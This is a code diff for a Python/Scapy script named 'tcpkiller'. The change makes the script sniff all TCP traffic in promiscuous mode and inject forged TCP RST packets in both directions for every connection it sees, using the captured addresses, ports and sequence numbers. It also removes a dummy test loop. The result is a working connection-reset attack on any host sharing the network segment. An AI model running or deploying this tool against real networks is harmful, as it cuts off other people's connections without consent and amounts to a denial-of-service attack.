@@ -93,7 +93,10 @@ if __name__ == "__main__":
 args = vars(parser.parse_args())
 validate_args(args)
 
+print("[*] Initialized tcpkiller")
+
 iface = args["interface"]
+verbose = args["verbose"]
 
 ###############################################################
 # Packet Handling                                             #
@@ -117,16 +120,25 @@ def build_packet(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, seq):
 ###############################################################
 
 def callback(packet):
-    print packet.show()
-    #if not packet[TCP].flags == 4L:
-    #    pass
-
+    flags = packet.sprintf("%TCP.flags%")
+    if not "R" in flags:
+        src_mac = packet[Ether].src
+        dst_mac = packet[Ether].dst
+        src_ip = packet[IP].src
+        dst_ip = packet[IP].dst
+        src_port = packet[TCP].sport
+        dst_port = packet[TCP].dport
+        seq = packet[TCP].seq
+        ack = packet[TCP].ack
+        if verbose:
+            print("RST from %s:%s (%s) --> %s:%s (%s) w/ %s" % (src_ip, src_port, src_mac, dst_ip, dst_port, dst_mac, ack))
+        send(build_packet(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, seq))
+        send(build_packet(dst_mac, src_mac, dst_ip, src_ip, dst_port, src_port, ack))
+ 
 socket = socket(PF_PACKET, SOCK_RAW)
 socket.bind((iface, 0))
-for i in range(0,100):
-    send(build_packet("aa:bb:cc:dd:ee:ff", "aa:bb:cc:dd:ee:ff", "1.1.1.1", "1.1.1.1", 124, 1241, 4))
 
-#conf.sniff_promisc = True
-#sniff(filter='tcp', prn=callback, store=0)
+conf.sniff_promisc = True
+sniff(filter='tcp', prn=callback, store=0)
 
 socket.close()
